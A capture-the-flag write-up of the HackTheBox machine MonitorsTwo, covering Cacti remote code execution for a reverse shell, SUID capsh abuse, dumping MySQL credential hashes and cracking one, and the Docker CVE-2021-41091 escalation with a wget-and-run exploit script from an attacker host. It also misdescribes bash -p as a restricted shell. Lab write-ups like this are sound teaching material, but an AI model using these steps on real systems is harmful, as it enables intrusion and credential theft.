---
tags:
  - moby
  - docker
  - suid
  - mysql
  - CVE-2021-41091
---
# HTB: MonitorsTwo

***Overview**: MonitorsTwo is an Easy rated machine on hackthebox that exploits a vulnerable version of a web server to gain foothold into a containerized environment and then uses credentials after dumping the database on the docker container to gain foothold on the target. The machine then exploits CVE-2021-41091 caused by Moby in a vulnerable Docker engine to escalate privileges to root on the host machine.*
## Scanning and enumeration

- so after a port and service scan, we saw two open ports

```shell
PORT   STATE SERVICE VERSION
22/tcp open ssh syn-ack syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
(Ubuntu Linux; protocol 2.0) 
| ssh-hostkey: 
|     3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS
|   http-favicon: Unknown favicon MD5:
|4F12CCCD3C42A4A478F067337FE92794
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
```

### Port 80

- Navigating to port 80, we are brought to the login page below

![](assets/MonitorsTwo_assets/Pasted%20image%2020230902131942.png)

- from this we have identified that the target is running cacti version 1.2.22

## Exploitation

- so checking for exploits relating to this version we come across an RCE [https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22) , we can also find the exploitdb version at [ExploitDB](https://www.exploit-db.com/exploits/51166)

- To understand the exploit more, we use  [Unauthenticated Command Injection · Advisory · Cacti/cacti (github.com)](https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf) and [https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169#exploit](https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169#exploit)

![](assets/MonitorsTwo_assets/Pasted%20image%2020230902132317.png)

- so running `python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.14.86 --LPORT=4444`

![](assets/MonitorsTwo_assets/Pasted%20image%2020230902132708.png)

- we can see that we get a reverse shell in our nc listener

![](assets/MonitorsTwo_assets/Pasted%20image%2020230902132756.png)

## Possible privilege Escalation??
- So we run our linpeas script and the first things we notice are the interesting files in root, but we'll come back to that in a few minutes

![](assets/MonitorsTwo_assets/Pasted%20image%2020230902163754.png)

- we can also see that we have a binary capsh with a SUID bit

![](assets/MonitorsTwo_assets/Pasted%20image%2020230902163952.png)

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904165337.png)

- so by running the command below, we have elevated our shell to root

```
capsh --gid=0 --uid=0 --
```

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904165320.png)
OR THAT'S WHAT IT MEANS RIGHT??!!!
NOOOO
### Lets go back to the interesting files we found!!

- if we remember we found these interesting files in out root directory

![](assets/MonitorsTwo_assets/Pasted%20image%2020230902163754.png)

- once we notice the dockerenv file, now this gives us a hint that we are inside a docker container

```ad-info
when a container is created docker places an empty file .dockerenv at the root of its file system (i.e /.dockerenv). So every container has a .dockerenv file in its system's root
```

```ad-hint
another thing that gives us a hint that we are in a docker container is the randomized hostname of the machine
```

- lets go ahead and look at the script entrypoint.sh

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904173447.png)

- then running the script, we can see what it does is to list tables in the cacti database

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904173546.png)

-  we can run the command in our terminal and we also get the same output

```shell
mysql --host=db --user=root --password=root cacti -e 'show tables'
```

- we can also list the databases with the command 

```shell
mysql --host=db --user=root --password=root cacti -e 'show databases'
```

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904173741.png)
- we can also also list the tables in the mysql database

```shell
mysql --host=db --user=root --password=root mysql -e 'show tables'
```

```shell
root@50bca5e748b0:/# mysql --host=db --user=root --password=root mysql -e 'show tables'
< --user=root --password=root mysql -e 'show tables'
Tables_in_mysql
columns_priv
db
engine_cost
event
func
general_log
gtid_executed
help_category
help_keyword
help_relation
help_topic
innodb_index_stats
innodb_table_stats
ndb_binlog_index
plugin
proc
procs_priv
proxies_priv
server_cost
servers
slave_master_info
slave_relay_log_info
slave_worker_info
slow_log
tables_priv
time_zone
time_zone_leap_second
time_zone_name
time_zone_transition
time_zone_transition_type
user
```

- we can check for all the tables that have content (not empty) in mysql with the following command

```shell
mysql --host=db --user=root --password=root mysql -e 'select table_name,table_rows from information_schema.tables where table_schema="mysql" and table_rows>0;'
```

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904174616.png)

- so if we keep looking at our cacti database, we notice there is a use_auth table, so we can specify that and list the columns in the table

```shell
mysql --host=db --user=root --password=root cacti -e 'select column_name from information_schema.columns where table_schema="cacti" and table_name="user_auth";' --table
```

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904175242.png)

- we can see that there are different rows including a username and a password, so we can view the contents of these columns, and we can see in our output that we were able to retrieve some usernames as well as password hashes

```shell
mysql --host=db --user=root --password=root cacti -e 'select id,username,password from user_auth' --table
```

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904175500.png)

```shell
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
|  3 | guest    | 43e9a4ab75570f5b                                             |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----+----------+--------------------------------------------------------------+

```

- we took that of the user marcus in attempt to crack it using john or hashcat (the other hash we found was taking forever to crack)
- using John, we then got the password of marcus as `funkymonkey`

```shell
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904181951.png)

## Foothold

- so we can now ssh using the newly found credentials we have

```shell
ssh marcus@10.10.11.211
```

and funkymonkey as the password

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904184457.png)

 - and we can view the user flag

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916133300.png)

- once we login in the SSH, something that is very easy to miss (cause i missed this, lol) was the notification that we have a mail
- so we go ahead to search for common mail locations in linux, and we are brought with a couple

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916133458.png)

- so we go ahead to check the /var/mail/marcus file for the mail, and we do have a mail

![](assets/MonitorsTwo_assets/Pasted%20image%2020230904184745.png)

```text
marcus@monitorstwo:~$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

- we can see that this mail warns about several vulnerabilities that should be patched, so why don't we check if they were patched :)
- we can check our kernel version for the first vulnerability (doesn't look like a patched kernel version), lets hold on for the kernel exploit tho, as for the second vulnerability, we already exploit an RCE vulnerability to gain our first foothold so that is out of the picture. But for the third vulnerability, if we check our docker engine version, we will see that we are actually running a vulnerable version of docker

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916135530.png)

- now this vulnerability actually affects Moby

```ad-note
Moby is an open-source project that provides a set of components and tools for building container-based systems. It includes libraries, frameworks, and building blocks for assembling containerization solutions. Docker, Inc. uses Moby as the basis for building Docker products, but you can also use Moby components to create your own containerization solutions.

Docker, the company, used to package the Docker platform as a set of tools and services built on top of the Moby project.

Moby is a place for all container enthusiasts to experiment and exchange ideas

Moby is like a collection of building blocks that can be assembled to create various container based systems
```

- We can find more information about this CVE at [NVD - CVE-2021-41091 (nist.gov)](https://nvd.nist.gov/vuln/detail/CVE-2021-41091)

![](assets/MonitorsTwo_assets/Pasted%20image%2020230908122956.png)

- so this basically this vulnerability was due to lack of restriction of privileges in the data directory, because it contained subdirectories that would allow unprivileged users (like us) to traverse directories and also execute programs. so these executable files cold be files with SUID permissions, so if an unprivileged user found such an executable they could execute it as the file owner. so the user ID of the user on the Linux host would collide with that of the file owner or group in the container and then the unprivileged user can then read and modify the files.
- so we found an exploit for this vulnerability here [UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com)](https://github.com/UncleJ4ck/CVE-2021-41091)

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916132348.png)

- we can then follow the steps in this exploit

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916132156.png)

- so first off, we obtain root access on the docker container (which we already did by exploit capsh binary earlier. With this root access, we run the following and this is just to set the SUID bit on the /bin/bash file

```shell
chmod u+s /bin/bash
```

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916132059.png)

- then we get the exploit on the host system, make it executable and run it

```
wget http://10.10.14.76/exp.sh
chmod +x exp.sh
./exp.sh
```

- then we also confirm "yes" that we have set the suid bit bit on /bin/bash
- after running the exploit on our target host,  then we change to the path of our docker container on our host, which also contains the /bin/bash binary, and then we can run the command

```shell
./bin/bash -p
```

```ad-info
the `-p` option creates a new restricted shell environment
```

- and we have access as root

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916131939.png)

- so now we can view our root flag

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916133222.png)

- we can also see that we have the euid of root

![](assets/MonitorsTwo_assets/Pasted%20image%2020230916140326.png)

```ad-note
The UID is the actual user ID of the user that started the process while the EUID (Effective UID) governs te actual privileges of the process execution.

The UID is the ID of the user that executed the program while the EUID is the User ID the process is executing as

they are usually equal except using programs with SUID (SetUID)
```



